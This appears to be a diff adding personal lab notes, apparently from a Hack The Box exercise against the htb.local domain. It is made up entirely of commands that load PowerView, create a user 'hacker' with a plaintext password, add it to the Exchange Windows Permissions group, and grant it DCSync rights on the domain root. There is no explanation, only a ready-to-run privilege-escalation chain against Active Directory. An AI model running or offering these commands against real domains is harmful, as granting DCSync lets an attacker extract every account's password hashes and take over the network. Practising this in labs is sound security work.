@@ -1,0 +1,15 @@
+powerview to add user
+
+. .\powerview
+
+net user hacker hacker54321 /add
+
+net group "exchange windows permissions"
+
+net group "exchange windows permissions" /add hacker
+
+$pass = ConvertTo-SecureString 'hacker54321' -AsPlainText -Force
+
+$Cred = New-Object System.Management.Automation.PSCredential('htb\\hacker',$pass)
+
+Add-DomainObjectAcl    -Credential $Cred -TargetIdentity "DC=htb,DC=local"  -PrincipalIdentity hacker -Rights DCSync
